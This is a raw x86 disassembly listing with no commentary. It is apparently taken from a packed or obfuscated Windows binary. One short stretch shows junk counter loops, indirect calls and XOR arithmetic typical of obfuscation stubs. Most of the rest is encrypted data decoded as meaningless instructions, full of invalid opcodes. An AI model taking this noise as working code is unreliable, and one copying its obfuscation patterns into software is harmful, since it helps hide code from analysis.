  418935:	pop    DWORD PTR [ecx+0x37ffd966]
  41893b:	mov    al,ds:0xce3f60da
  418940:	into   
  418941:	push   esp
  418942:	das    
  418943:	push   esi
  418944:	test   al,0xbb
  418946:	pop    es
  418947:	ficomp WORD PTR [eax]
  418949:	or     edi,edi
  41894b:	lahf   
  41894c:	bound  ecx,QWORD PTR [edx]
  41894e:	dec    ecx
  41894f:	adc    edx,esp
  418951:	sbb    eax,0x7f23f4b2
  418956:	xor    eax,0x703a5063
  41895b:	in     eax,dx
  41895c:	iret   
  41895d:	mov    dh,0x85
  41895f:	xchg   edi,eax
  418960:	xchg   BYTE PTR [edx],ah
  418962:	neg    BYTE PTR [edi+0x78]
  418965:	icebp  
  418966:	imul   ecx
  418968:	fidiv  WORD PTR [esi+eiz*4+0x27]
  41896c:	(bad)
  41896f:	push   edx
  418970:	add    al,0x96
  418972:	(bad)  
  418973:	sub    eax,0x30a343fe
  418978:	add    dh,bl
  41897a:	leave  
  41897b:	sbb    eax,0xfc203bd9
  418980:	inc    esi
  418981:	rcr    BYTE PTR gs:[ebx+0x6b],cl
  418985:	scas   al,BYTE PTR es:[edi]
  418986:	sar    ah,1
  418988:	pop    es
  418989:	pop    ebx
  41898a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41898b:	in     al,dx
  41898c:	mov    ah,0x4f
  41898e:	jne    0x418918
  418990:	push   0x79031516
  418995:	jo     0x4189dd
  418997:	in     eax,dx
  418998:	dec    esp
  418999:	dec    BYTE PTR [esi+ebx*8]
  41899c:	mov    ds,WORD PTR [ebx-0x3b]
  41899f:	(bad)  
  4189a0:	arpl   WORD PTR [edx-0x38d68c82],di
  4189a6:	add    ecx,DWORD PTR [esi+0x6b]
  4189a9:	aam    0xcb
  4189ab:	imul   BYTE PTR [eax-0x2ce4cc7d]
  4189b1:	mov    ah,0xfe
  4189b3:	pop    eax
  4189b4:	cld    
  4189b5:	add    DWORD PTR [ebx+0x256970dc],0x4d
  4189bc:	addr16 idiv edx
  4189bf:	jb     0x4189d1
  4189c1:	or     al,0x1e
  4189c3:	cs or  al,0xe7
  4189c6:	xor    ecx,eax
  4189c8:	add    ecx,esi
  4189ca:	adc    DWORD PTR ds:0x42a2ee,edi
  4189d0:	mov    DWORD PTR [ebp-0xc],ecx
  4189d3:	add    DWORD PTR ds:0x42a25a,0x6cdc
  4189dd:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4189e4:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  4189ee:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4189f5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4189fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4189ff:	mov    DWORD PTR ds:0x42a2ee,0x1b
  418a09:	cmp    DWORD PTR ds:0x42a2ee,0x0
  418a10:	je     0x418a4a
  418a16:	cmp    DWORD PTR ds:0x42a2ee,0x1c
  418a1d:	ja     0x418a4a
  418a23:	jmp    0x418a38
  418a28:	push   0x4b24
  418a2d:	push   0x42a296
  418a32:	call   DWORD PTR ds:0x42a3f2
  418a38:	mov    edi,DWORD PTR ds:0x42a2ee
  418a3e:	dec    edi
  418a3f:	mov    DWORD PTR ds:0x42a2ee,edi
  418a45:	jmp    0x418a09
  418a4a:	mov    DWORD PTR [ebp+0x8],ecx
  418a4d:	mov    edi,DWORD PTR ds:0x42a28e
  418a53:	xor    edi,DWORD PTR ds:0x42a2c6
  418a59:	mov    DWORD PTR ds:0x42a28e,edi
  418a5f:	mov    ecx,DWORD PTR [ebp+0x8]
  418a62:	xor    ecx,eax
  418a64:	mov    DWORD PTR ds:0x42a2b6,0x16
  418a6e:	cmp    DWORD PTR ds:0x42a2b6,0x0
  418a75:	je     0x418aac
  418a7b:	cmp    DWORD PTR ds:0x42a2b6,0x1d
  418a82:	ja     0x418aac
  418a88:	jmp    0x418a98
  418a8d:	push   0x42a28a
  418a92:	call   DWORD PTR ds:0x42a3f6
  418a98:	xor    edi,edi
  418a9a:	xor    edi,DWORD PTR ds:0x42a2b6
  418aa0:	dec    edi
  418aa1:	mov    DWORD PTR ds:0x42a2b6,edi
  418aa7:	jmp    0x418a6e
  418aac:	add    ecx,esi
  418aae:	mov    ecx,0x242ebc9
  418ab3:	mov    edi,0xf641bc8
  418ab8:	je     0x421e4f
  418abe:	and    DWORD PTR ds:0x42a27a,0x0
  418ac8:	jmp    0x418adc
  418acd:	xor    ebx,ebx
  418acf:	or     ebx,DWORD PTR ds:0x42a27a
  418ad5:	inc    ebx
  418ad6:	mov    DWORD PTR ds:0x42a27a,ebx
  418adc:	cmp    DWORD PTR ds:0x42a27a,0x14
  418ae3:	jae    0x418b2d
  418ae9:	cmp    DWORD PTR ds:0x42a27a,0xa
  418af0:	jb     0x418b2d
  418af6:	jmp    0x418b0e
  418afb:	push   DWORD PTR [ebp-0x14]
  418afe:	push   0x42a272
  418b03:	push   0x7a1d
  418b08:	call   DWORD PTR ds:0x42a3fa
  418b0e:	cmp    DWORD PTR ds:0x42a27a,0x9
  418b15:	jne    0x418b28
  418b1b:	mov    ebx,DWORD PTR ds:0x42a27a
  418b21:	inc    ebx
  418b22:	mov    DWORD PTR ds:0x42a27a,ebx
  418b28:	jmp    0x418acd
  418b2d:	mov    edx,DWORD PTR [ebp+0x8]
  418b30:	mov    ebx,DWORD PTR [ebp-0x8]
  418b33:	xor    edx,eax
  418b35:	xor    ebx,eax
  418b37:	sub    edx,ebx
  418b39:	sub    DWORD PTR ds:0x42a26e,edi
  418b3f:	sub    edx,esi
  418b41:	sub    ebx,0x5edd
  418b47:	xor    edx,eax
  418b49:	adc    ebx,DWORD PTR ds:0x42a272
  418b4f:	mov    DWORD PTR [ebp+0x8],edx
  418b52:	adc    DWORD PTR ds:0x42a2d6,edx
  418b58:	jmp    0x41aeb0
  418b5d:	add    al,ch
  418b5f:	test   BYTE PTR [edx-0x15ff7d6a],0x26
  418b66:	and    BYTE PTR [edx-0x3e],dl
  418b69:	dec    ebx
  418b6a:	sbb    DWORD PTR [edi],esi
  418b6c:	nop
  418b6d:	(bad)  
  418b6e:	sbb    al,0x7c
  418b70:	add    DWORD PTR [esi+0x5e],0xffffff83
  418b74:	adc    DWORD PTR ds:0x2374cacf,0xffffff90
  418b7b:	mov    eax,ds:0x3274afd7
  418b80:	lds    esi,FWORD PTR [ebx+ebp*8-0x57aaed9]
  418b87:	popa   
  418b88:	popa   
  418b89:	fstp   DWORD PTR [ecx+0x5af61595]
  418b8f:	clc    
  418b90:	hlt    
  418b91:	sbb    ch,BYTE PTR [eax+0x70]
  418b94:	xchg   DWORD PTR [edx],esi
  418b96:	and    edi,DWORD PTR [ebp+0x563f27d9]
  418b9c:	push   cs
  418b9d:	into   
  418b9e:	aaa    
  418b9f:	mov    bl,BYTE PTR [edx+ebp*2]
  418ba2:	and    eax,0xd52b96a
  418ba7:	push   0x5d6ef4fa
  418bac:	repz clc 
  418bae:	dec    ebp
  418baf:	jg     0x418c1a
  418bb1:	sbb    eax,0xbacee467
  418bb6:	arpl   WORD PTR [eax],di
  418bb8:	jno    0x418c30
  418bba:	bnd jp 0x418bc1
  418bbd:	mov    ebp,0x180be3d6
  418bc2:	int3   
  418bc3:	push   ebx
  418bc4:	inc    eax
  418bc5:	lods   eax,DWORD PTR ds:[esi]
  418bc6:	std    
  418bc7:	idiv   BYTE PTR [ebp+0x30bb1a00]
  418bcd:	push   ebp
  418bce:	clc    
  418bcf:	fiadd  WORD PTR [edx-0x35727c98]
  418bd5:	sub    BYTE PTR [eax+0x77],ah
  418bd8:	xchg   esp,eax
  418bd9:	pop    esi
  418bda:	nop
  418bdb:	lods   eax,DWORD PTR ds:[esi]
  418bdc:	xchg   esp,eax
  418bdd:	mov    cl,0xc5
  418bdf:	adc    ch,ah
  418be1:	jmp    0x65d533f3
  418be6:	(bad)  
  418be7:	jae    0x418ba1
  418be9:	jnp    0x418c32
  418beb:	lock push edx
  418bed:	outs   dx,DWORD PTR ds:[esi]
  418bee:	adc    ebx,ebx
  418bf0:	lods   al,BYTE PTR ds:[esi]
  418bf1:	ins    BYTE PTR es:[edi],dx
  418bf2:	dec    eax
  418bf3:	(bad)  
  418bf4:	std    
  418bf5:	call   0xad88:0xf46cf50b
  418bfc:	mov    dl,0x5a
  418bfe:	and    BYTE PTR [esi+0x3f],ah
  418c01:	or     al,0xfe
  418c03:	xor    esp,DWORD PTR [edx]
  418c05:	pop    eax
  418c06:	sbb    DWORD PTR [esi],0x61
  418c09:	sub    BYTE PTR [ecx+eax*4-0x70],ah
  418c0d:	popf   
  418c0e:	cmp    al,0xe8
  418c10:	xor    bl,BYTE PTR [edx]
  418c12:	xor    BYTE PTR [edi+0x3b93812b],bl
  418c18:	xchg   ebp,eax
  418c19:	push   esp
  418c1a:	sahf   
  418c1b:	data16 jp 0x418c91
  418c1e:	outs   dx,DWORD PTR ds:[esi]
  418c1f:	sub    eax,0x93763ae7
  418c24:	in     eax,0x81
  418c26:	dec    esp
  418c27:	and    DWORD PTR [ebp-0x22],0x30
  418c2b:	xchg   DWORD PTR [ebx],ebp
  418c2d:	sub    esp,ebx
  418c2f:	mov    bh,0x58
  418c31:	mov    ecx,0xed5d39e9
  418c36:	or     ebp,ebp
  418c38:	xchg   esp,eax
  418c39:	adc    eax,0xe9ab4119
  418c3e:	lods   al,BYTE PTR ds:[esi]
  418c3f:	push   esi
  418c40:	push   ebx
  418c41:	daa    
  418c42:	jns    0x418bee
  418c44:	dec    ebp
  418c45:	imul   edx,esi,0x77
  418c48:	cdq    
  418c49:	pop    eax
  418c4a:	and    bh,BYTE PTR [edx-0x44]
  418c4d:	loopne 0x418c35
  418c4f:	or     bl,ah
  418c51:	jae    0x418cb0
  418c53:	sbb    cl,BYTE PTR [ebp-0x3e]
  418c56:	cwde   
  418c57:	or     BYTE PTR [ecx-0x5cc0b682],cl
  418c5d:	test   BYTE PTR [ecx],0xfa
  418c60:	sub    esi,DWORD PTR [ebx]
  418c62:	repz in al,dx
  418c64:	icebp  
  418c65:	daa    
  418c66:	scas   al,BYTE PTR es:[edi]
  418c67:	xor    BYTE PTR [ecx-0x4ab030c5],ah
  418c6d:	enter  0xcfcf,0xe5
  418c71:	je     0x418c93
  418c73:	jmp    0x4b4a:0xa37c8c8e
  418c7a:	cmp    al,0x30
  418c7c:	jg     0x418ca4
  418c7e:	cmp    DWORD PTR [edi],0xccaa792b
  418c84:	mov    BYTE PTR [eax+0x7adbc5e1],cl
  418c8a:	sti    
  418c8b:	hlt    
  418c8c:	loope  0x418cf2
  418c8e:	les    ebx,FWORD PTR [edx]
  418c90:	inc    esp
  418c91:	pop    ebp
  418c92:	into   
  418c93:	add    al,0xd4
  418c95:	dec    esi
  418c96:	std    
  418c97:	xchg   esp,eax
  418c98:	rcr    DWORD PTR [edx-0x12],0xe9
  418c9c:	jae    0x418c87
  418c9e:	inc    ecx
  418c9f:	or     al,0x34
  418ca1:	add    bh,BYTE PTR [ebx+0x964f01b]
  418ca7:	cdq    
  418ca8:	mov    esp,0xe2fb8be6
  418cad:	sub    bl,dl
  418caf:	retf   
  418cb0:	out    dx,eax
  418cb1:	sub    DWORD PTR [eax],edx
  418cb3:	ins    BYTE PTR es:[edi],dx
  418cb4:	xor    al,0x14
  418cb6:	in     al,0x54
  418cb8:	or     al,0x2d
  418cba:	popf   
  418cbb:	mov    dh,0xf2
  418cbd:	mov    ebp,0xb49d7094
  418cc2:	or     eax,0x53054bee
  418cc7:	ret    
  418cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc9:	inc    esp
  418cca:	mov    dl,0x27
  418ccc:	aad    0x56
  418cce:	push   0x81736aed
  418cd3:	sbb    BYTE PTR [ebp-0x7e],bh
  418cd6:	sbb    BYTE PTR [ebp+0x70],ch
  418cd9:	and    ebp,esp
  418cdb:	sub    dl,ah
  418cdd:	pop    ebx
  418cde:	mov    cl,0xaa
  418ce0:	lods   al,BYTE PTR ds:[esi]
  418ce1:	pop    ds
  418ce2:	hlt    
  418ce3:	(bad)  
  418ce4:	fst    DWORD PTR [edi-0x21]
  418ce7:	pop    ecx
  418ce8:	sub    al,0x34
  418cea:	ror    DWORD PTR [ecx-0x64],1
  418ced:	data16 or dh,0x8b
  418cf1:	xor    BYTE PTR [ebx-0x261c0ec5],cl
  418cf7:	test   BYTE PTR [edx],0x5a
  418cfa:	adc    BYTE PTR [eax-0x7be55b53],0x63
  418d01:	rol    ecx,cl
  418d03:	ss aaa 
  418d05:	mov    esi,0x8327593a
  418d0a:	aad    0x2a
  418d0c:	mov    bl,0xd6
  418d0e:	lods   eax,DWORD PTR ds:[esi]
  418d0f:	aas    
  418d10:	adc    al,0x4f
  418d12:	xchg   esi,eax
  418d13:	inc    edi
  418d14:	inc    ecx
  418d15:	and    eax,0xabbfae2b
  418d1a:	repz sub esi,ecx
  418d1d:	xor    eax,0x8986a4f4
  418d22:	or     DWORD PTR [ebx-0x3e],ebx
  418d25:	sbb    dh,BYTE PTR [edx+eiz*8-0x9bebafd]
  418d2c:	adc    bh,BYTE PTR [edx-0xf1fe984]
  418d32:	sub    al,0x4d
  418d34:	cmp    eax,0x667d91e8
  418d39:	push   cs
  418d3a:	stc    
  418d3b:	and    ebx,ebx
  418d3d:	call   0x52f3edbd
  418d42:	sbb    al,0xa8
  418d44:	lahf   
  418d45:	out    0x5a,eax
  418d47:	(bad)  
  418d48:	xlat   BYTE PTR ds:[ebx]
  418d49:	mov    BYTE PTR [ecx-0x40],cl
  418d4c:	xchg   BYTE PTR [ebp-0x3672ca55],bh
  418d52:	xor    ecx,DWORD PTR [ecx+0x7a224282]
  418d58:	cmc    
  418d59:	scas   eax,DWORD PTR es:[edi]
  418d5a:	jmp    0xb074c013
  418d5f:	rcl    cl,0x1e
  418d62:	mov    ebx,0x136ed30f
  418d67:	(bad)  
  418d69:	imul   ecx,ecx,0x894ece31
  418d6f:	xlat   BYTE PTR ds:[ebx]
  418d70:	push   0xe20fedc
  418d75:	pop    ss
  418d76:	call   0x72f3e3d4
  418d7b:	sbb    dh,BYTE PTR [ebx+0x63a46dd4]
  418d81:	mov    eax,0x48055293
  418d86:	xchg   ecx,eax
  418d87:	adc    DWORD PTR [edi-0x7b],ebp
  418d8a:	dec    esp
  418d8b:	rcr    BYTE PTR [esi+0x66],0x98
  418d8f:	adc    cl,BYTE PTR [edx]
  418d91:	es push ebp
  418d93:	add    DWORD PTR [eax],ebx
  418d95:	iret   
  418d96:	pop    eax
  418d97:	xchg   ebx,eax
  418d98:	imul   edi,esi,0xfffffffe
  418d9b:	ss dec edi
  418d9d:	xchg   edx,eax
  418d9e:	cmp    edi,edi
  418da0:	or     DWORD PTR [eax+ebp*1],ecx
  418da3:	inc    edx
  418da4:	mov    BYTE PTR [ebx],cl
  418da6:	push   eax
  418da7:	or     esp,DWORD PTR [edi]
  418da9:	adc    al,0x3f
  418dab:	inc    ebx
  418dac:	daa    
  418dad:	dec    edi
  418dae:	cmp    BYTE PTR [edx],0x20
  418db1:	push   esp
  418db2:	fwait
  418db3:	loope  0x418dec
  418db5:	mov    dl,0x1e
  418db7:	xchg   ebx,eax
  418db8:	fimul  WORD PTR [esi+edi*4]
  418dbb:	fist   DWORD PTR [edx+0x351ca84f]
  418dc1:	sti    
  418dc2:	xchg   esp,eax
  418dc3:	mov    edx,0xef7e8a41
  418dc8:	push   0xa2f6ee2b
  418dcd:	mov    eax,ds:0xa21b839
  418dd2:	lahf   
  418dd3:	push   ss
  418dd4:	imul   ebp,DWORD PTR [edx+0x7aa9b1fb],0x14
  418ddb:	jno    0x418e3f
  418ddd:	mov    edx,0xcd44e136
  418de2:	dec    edx
  418de3:	cmp    eax,0xc1aeabdb
  418de8:	enter  0x886f,0x89
  418dec:	mov    ds:0x2d3c169e,eax
  418df1:	and    DWORD PTR [esi+0x538d9746],eax
  418df7:	adc    ah,al
  418df9:	out    0x2f,eax
  418dfb:	mov    al,ds:0x80d8082
  418e00:	dec    esi
  418e01:	cdq    
  418e02:	outs   dx,BYTE PTR ds:[esi]
  418e03:	mov    dl,0xb8
  418e05:	xchg   edx,eax
  418e06:	sbb    eax,0x12e20b76
  418e0b:	xlat   BYTE PTR ds:[ebx]
  418e0c:	xchg   esp,eax
  418e0d:	jmp    0x3671a711
  418e12:	xlat   BYTE PTR ds:[ebx]
  418e13:	ret    
  418e14:	fwait
  418e15:	leave  
  418e16:	mov    ah,0xb7
  418e18:	mov    eax,0x15e4ea52
  418e1d:	in     al,dx
  418e1e:	into   
  418e1f:	mov    ecx,0xc0660ed6
  418e24:	cmp    eax,DWORD PTR [ecx*4-0x3165b498]
  418e2b:	out    dx,eax
  418e2c:	ret    0xf3dd
  418e2f:	adc    al,0xd0
  418e31:	jns    0x418ea2
  418e33:	xlat   BYTE PTR ds:[ebx]
  418e34:	and    esi,ebp
  418e36:	(bad)  
  418e37:	xchg   edi,eax
  418e38:	shr    DWORD PTR [ecx+ecx*2-0x7e],0x98
  418e3d:	pushf  
  418e3e:	out    0x7a,al
  418e40:	mov    bl,0x29
  418e42:	add    ebp,DWORD PTR [ebp-0x2d]
  418e45:	int    0x97
  418e47:	pusha  
  418e48:	or     eax,0xdc2ab182
  418e4d:	ret    
  418e4e:	je     0x418e91
  418e50:	cmp    dl,cl
  418e52:	push   ss
  418e53:	rcl    BYTE PTR [ecx],cl
  418e55:	ret    
  418e56:	in     eax,0x69
  418e58:	imul   ecx,esi,0x4e
  418e5b:	jmp    0xb53d:0x23e1
  418e61:	jo     0x418e88
  418e63:	push   esi
  418e64:	scas   al,BYTE PTR es:[edi]
  418e65:	adc    BYTE PTR [edi+0x43],bl
  418e68:	pop    eax
  418e69:	mov    edx,es
  418e6b:	div    DWORD PTR [esp+ecx*4]
  418e6e:	push   ecx
  418e6f:	xlat   BYTE PTR ds:[ebx]
  418e70:	inc    esp
  418e71:	dec    esi
  418e72:	retf   
  418e73:	(bad)  
  418e75:	js     0x418e74
  418e77:	push   cs
  418e78:	and    DWORD PTR [esi+0x20f5f275],edx
  418e7e:	out    dx,al
  418e7f:	push   eax
  418e80:	push   ebx
  418e81:	iret   
  418e82:	xchg   edi,eax
  418e83:	push   ss
  418e84:	loopne 0x418e8c
  418e86:	test   BYTE PTR [esi+0x5a],al
  418e89:	test   al,0x6c
  418e8b:	repz (bad) 
  418e8d:	(bad)  
  418e8e:	lock outs dx,DWORD PTR ds:[esi]
  418e90:	enter  0xd7fa,0x9f
  418e94:	dec    esi
  418e95:	jo     0x418e6f
  418e97:	out    dx,al
  418e98:	xor    eax,0x8aadf004
  418e9d:	dec    esi
  418e9e:	cdq    
  418e9f:	xor    al,0x7c
  418ea1:	test   eax,0xad23241d
  418ea6:	xchg   esp,eax
  418ea7:	shl    eax,0xe5
  418eaa:	cwde   
  418eab:	push   ebp
  418eac:	push   ds
  418ead:	jae    0x418e77
  418eaf:	stc    
  418eb0:	ins    DWORD PTR es:[edi],dx
  418eb1:	adc    esp,DWORD PTR [ebp-0x26b79e2b]
  418eb7:	test   ebx,edi
  418eb9:	out    0xa6,eax
  418ebb:	dec    ebx
  418ebc:	mov    ebx,0x12cfcc37
  418ec1:	lds    esi,FWORD PTR [ebx]
  418ec3:	jo     0x418e73
  418ec5:	jnp    0x418f08
  418ec7:	push   esi
  418ec8:	cmp    DWORD PTR [eax+0xc],esi
  418ecb:	push   ss
  418ecc:	pop    ds
  418ecd:	jle    0x418e68
  418ecf:	repz fs cs jl 0x418eed
  418ed4:	stos   BYTE PTR es:[edi],al
  418ed5:	adc    ebx,edx
  418ed7:	not    DWORD PTR [ebx-0x3f50b13b]
  418edd:	imul   edx,DWORD PTR [ebx],0xa
  418ee0:	xchg   ebx,eax
  418ee1:	sub    ebx,DWORD PTR [ebp+0x33]
  418ee4:	out    0x7a,al
  418ee6:	sub    al,0x60
  418ee8:	push   ebx
  418ee9:	dec    eax
  418eea:	repnz cmp al,0xf2
  418eed:	mov    ch,0xf6
  418eef:	add    al,0xbd
  418ef1:	ror    BYTE PTR [ebx],1
  418ef3:	int3   
  418ef4:	stos   BYTE PTR es:[edi],al
  418ef5:	stc    
  418ef6:	popf   
  418ef7:	mov    cl,0x6c
  418ef9:	add    BYTE PTR [edi+0x7623dedf],bl
  418eff:	and    ah,BYTE PTR [esp+eiz*8-0x1a]
  418f03:	xchg   ebp,eax
  418f04:	fadd   st(0),st
  418f06:	cmp    BYTE PTR [esi-0x14231510],bl
  418f0c:	loope  0x418ea5
  418f0e:	sbb    al,0x2
  418f10:	mov    BYTE PTR [edx],bl
  418f12:	(bad)  
  418f13:	outs   dx,BYTE PTR ds:[esi]
  418f14:	mov    dl,ah
  418f16:	sub    eax,0xdb5d54b
  418f1b:	ins    DWORD PTR es:[edi],dx
  418f1c:	mov    bl,BYTE PTR [edi]
  418f1e:	imul   edi,DWORD PTR ds:0xedae865a,0xda4e2980
  418f28:	lahf   
  418f29:	pop    esp
  418f2a:	jo     0x418eda
  418f2c:	out    dx,eax
  418f2d:	xchg   ebp,eax
  418f2e:	lds    esp,FWORD PTR [esi]
  418f30:	pop    esi
  418f31:	in     eax,0xad
  418f33:	mov    ebp,0xf22a422
  418f38:	sbb    cl,dl
  418f3a:	stos   BYTE PTR es:[edi],al
  418f3b:	xor    eax,0x289e5daf
  418f40:	pop    es
  418f41:	xchg   DWORD PTR [edi+0x5d54a3e7],ecx
  418f47:	int3   
  418f48:	xor    eax,0xebb6f0b6
  418f4d:	(bad)  
  418f4e:	fbld   TBYTE PTR [eax+ebp*2]
  418f51:	or     ebp,DWORD PTR [edx-0x2d]
  418f54:	jae    0x418f18
  418f56:	add    dl,BYTE PTR [esi]
  418f58:	ror    BYTE PTR [edx],1
  418f5a:	xchg   esi,eax
  418f5b:	dec    edx
  418f5c:	lock mov ds:0xa84cffd0,eax
  418f62:	mov    esi,0x18dfec16
  418f67:	pop    ecx
  418f68:	enter  0xf783,0x6b
  418f6c:	or     ebx,ecx
  418f6e:	mov    ebp,0x939e883b
  418f73:	out    dx,eax
  418f74:	test   al,0x9
  418f76:	les    eax,FWORD PTR [ecx+edx*8+0x79b5b372]
  418f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f7e:	sbb    eax,0x7afda21b
  418f83:	ss push ss
  418f85:	in     al,0xa5
  418f87:	xchg   edi,eax
  418f88:	push   esp
  418f89:	inc    esp
  418f8a:	xchg   BYTE PTR [ebx-0x1d],al
  418f8d:	loopne 0x418f36
  418f8f:	fmulp  st(1),st
  418f91:	dec    edi
  418f92:	call   0xf84b8a2b
  418f97:	ffree  st(5)
  418f99:	jmp    0x418fdd
  418f9b:	(bad)  
  418f9c:	jmp    0xf4d87c3
  418fa1:	sbb    DWORD PTR [ecx+0x2d],esi
  418fa4:	push   0xfffffff2
  418fa6:	jne    0x418f8b
  418fa8:	lods   eax,DWORD PTR ds:[esi]
  418fa9:	xor    ah,BYTE PTR [ecx+0x7bd97b3]
  418faf:	enter  0x458c,0x46
  418fb3:	jmp    0x419033
  418fb5:	jns    0x418fef
  418fb7:	jmp    0x418f57
  418fb9:	xchg   esi,eax
  418fba:	cmp    DWORD PTR [eax-0x5e],ebx
  418fbd:	pusha  
  418fbe:	fwait
  418fbf:	pusha  
  418fc0:	popa   
  418fc1:	xchg   ebx,eax
  418fc2:	aaa    
  418fc3:	in     al,dx
  418fc4:	pop    ebx
  418fc5:	xor    esp,DWORD PTR [edx]
  418fc7:	push   ecx
  418fc8:	xor    esi,esi
  418fca:	pop    ds
  418fcb:	mov    esp,0xddef303b
  418fd0:	jno    0x418fba
  418fd2:	xor    BYTE PTR [ebx+0x5b],0xf8
  418fd6:	pop    edi
  418fd7:	jne    0x419001
  418fd9:	pop    es
  418fda:	test   esi,ebx
  418fdc:	mov    DWORD PTR [ebx+0x9],esp
  418fdf:	and    al,0xa
  418fe1:	les    esi,FWORD PTR [ebx-0xc]
  418fe4:	in     eax,dx
  418fe5:	or     ebp,DWORD PTR [eax-0x50872289]
  418feb:	mov    bl,0x5c
  418fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fee:	cmp    edx,DWORD PTR [edx+0x4]
  418ff1:	icebp  
  418ff2:	enter  0x23c3,0xc9
  418ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ff7:	daa    
  418ff8:	es push esi
  418ffa:	inc    DWORD PTR [ecx+0x452d8f04]
  419000:	popf   
  419001:	mov    dl,0x75
  419003:	aaa    
  419004:	pop    ds
  419005:	adc    ah,BYTE PTR [eax-0x46fd4e2e]
  41900b:	jmp    0x419004
  41900d:	push   esi
  41900e:	adc    eax,ebx
  419010:	mov    cl,0x31
  419012:	cmp    cl,BYTE PTR [edi+edi*2+0x175ab1af]
  419019:	retf   
  41901a:	mov    bl,bh
  41901c:	dec    ecx
  41901d:	inc    edi
  41901e:	loope  0x418fc9
  419020:	loopne 0x419008
  419022:	or     al,0x51
  419024:	sbb    al,0xe1
  419026:	jg     0x418fac
  419028:	pop    esi
  419029:	mov    bl,0x66
  41902b:	test   al,0x2c
  41902d:	inc    edx
  41902e:	in     eax,0x7d
  419030:	(bad)  
  419031:	push   0xea06bdd6
  419036:	call   0xca67:0x4f0699a5
  41903d:	test   dl,dl
  41903f:	and    dl,BYTE PTR [edx+0x28]
  419042:	test   al,0xc6
  419044:	xor    ch,BYTE PTR [edx]
  419046:	loopne 0x419021
  419048:	cs mov esp,0x88dcd21e
  41904e:	repnz mov ebp,0x7393ad59
  419054:	repz cmc 
  419056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419057:	xchg   BYTE PTR [edi+ecx*4],bh
  41905a:	sbb    al,0xf2
  41905c:	retf   0xcfd8
  41905f:	js     0x4190ba
  419061:	data16 fidiv WORD PTR [edi-0x38]
  419065:	xchg   BYTE PTR [ecx+0x7b],bh
  419068:	mov    BYTE PTR [ecx+0x1e],bl
  41906b:	mov    dh,0xe3
  41906d:	push   edx
  41906e:	adc    al,0x8
  419070:	push   ebp
  419071:	popf   
  419072:	or     ebp,edi
  419074:	mov    bh,0x2c
  419076:	push   0x17aad00
  41907b:	stos   DWORD PTR es:[edi],eax
  41907c:	xchg   BYTE PTR [ecx+edi*8+0x3a16c12e],ch
  419083:	dec    DWORD PTR [ecx-0x3d556c15]
  419089:	(bad)
  41908e:	add    eax,0xf200cd20
  419093:	push   cs
  419094:	and    eax,0xcb63f4a0
  419099:	es aad 0x3f
  41909c:	(bad)  
  41909e:	cmp    DWORD PTR [eax*1-0x6d127720],ebx
  4190a5:	inc    edi
  4190a6:	or     bh,BYTE PTR [ecx+eiz*1]
  4190a9:	jae    0x4190ca
  4190ab:	jnp    0x4190a7
  4190ad:	mov    ds:0x397cc044,eax
  4190b2:	out    dx,eax
  4190b3:	cmp    al,0xde
  4190b5:	(bad)  
  4190b6:	in     eax,0x29
  4190b8:	pop    esi
  4190b9:	mov    ebx,0xb3028495
  4190be:	in     eax,0x79
  4190c0:	mov    cl,0x6b
  4190c2:	mov    cl,0xef
  4190c4:	jmp    0x419137
  4190c6:	mov    dl,0x32
  4190c8:	mov    eax,0x63f0bcdc
  4190cd:	xor    ah,dh
  4190cf:	mov    al,0x87
  4190d1:	mov    ebx,0x2f58c13c
  4190d6:	sbb    al,0x14
  4190d8:	idiv   BYTE PTR [esi+0x13bb0c00]
  4190de:	mul    BYTE PTR [edi]
  4190e0:	or     al,ch
  4190e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190e3:	or     DWORD PTR [edx],ebp
  4190e5:	inc    esi
  4190e6:	push   0x2df9716c
  4190eb:	mov    bl,0x8
  4190ed:	sahf   
  4190ee:	inc    ebp
  4190ef:	pop    esi
  4190f0:	inc    DWORD PTR [edx-0x695d83ed]
  4190f6:	outs   dx,DWORD PTR ds:[esi]
  4190f7:	js     0x4190d7
  4190f9:	(bad)  
  4190fa:	jb     0x41916b
  4190fc:	out    0xa3,eax
  4190fe:	loop   0x41913c
  419100:	mov    ds:0xd883f03,eax
  419105:	lods   eax,DWORD PTR ds:[esi]
  419106:	sub    ebp,0xb5c379ff
  41910c:	adc    ebp,DWORD PTR [ebp-0x13]
  41910f:	adc    esp,ebp
  419111:	jns    0x419112
  419113:	push   ebx
  419114:	xchg   esp,eax
  419115:	pop    ebp
  419116:	iret   
  419117:	jle    0x41917b
  419119:	mov    WORD PTR [ebx+ebx*2],es
  41911c:	add    esp,DWORD PTR ds:0xcec48fcf
  419122:	enter  0x23f,0xc7
  419126:	adc    edx,DWORD PTR [edi-0x80]
  419129:	retf   0x216
  41912c:	sar    DWORD PTR [edx+0x2ec84e1c],cl
  419132:	adc    esi,DWORD PTR [ebx-0x43]
  419135:	icebp  
  419136:	popf   
  419137:	inc    edx
  419138:	sub    ah,BYTE PTR [edx]
  41913a:	sub    BYTE PTR [eax+0x603f5d1],dh
  419140:	ret    0x9fb6
  419143:	pop    ebx
  419144:	jg     0x41918c
  419146:	mov    al,0x59
  419148:	mov    eax,0x80ea5b5
  41914d:	xlat   BYTE PTR ds:[ebx]
  41914e:	xchg   BYTE PTR [edx+0x42],bl
  419151:	mov    eax,ds:0xeb44394
  419156:	mov    bh,0x78
  419158:	jbe    0x419100
  41915a:	push   ecx
  41915b:	fisubr DWORD PTR [ebx+0x129f91c6]
  419161:	and    bh,bl
  419163:	ins    BYTE PTR es:[edi],dx
  419164:	jp     0x419151
  419166:	repz add BYTE PTR [edi+0x53fd5a52],0x79
  41916e:	inc    ecx
  41916f:	and    BYTE PTR [ebp+0x3beeeba2],dh
  419175:	pusha  
  419176:	push   esi
  419177:	js     0x419113
  419179:	inc    edi
  41917a:	or     eax,0xcf9839f9
